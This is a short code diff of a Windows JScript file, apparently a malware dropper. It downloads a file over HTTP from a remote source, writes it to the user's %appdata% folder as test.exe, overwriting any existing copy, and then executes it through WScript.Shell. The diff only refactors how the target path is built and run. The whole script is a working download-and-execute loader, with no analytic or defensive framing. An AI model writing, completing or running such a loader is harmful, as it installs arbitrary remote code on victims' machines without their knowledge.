@@ -4,7 +4,9 @@ var Object = WScript.CreateObject('MSXML2.XMLHTTP');
 
 Object.Open('GET', Source, false);
 Object.Send();
-
+var r = new ActiveXObject("WScript.Shell");
+var appdata = r.ExpandEnvironmentStrings("%appdata%");
+Target = appdata + "\\test.exe"
 if (Object.Status == 200)
 {
     // Create the Data Stream
@@ -26,5 +28,5 @@ if (Object.Status == 200)
     // Write the Data Stream to the File
     Stream.SaveToFile(Target, 2); // adSaveCreateOverWrite
     Stream.Close();
-    var r = new ActiveXObject("WScript.Shell").Run("%appdata%\\test.exe");
+    r.Run(Target);
 }
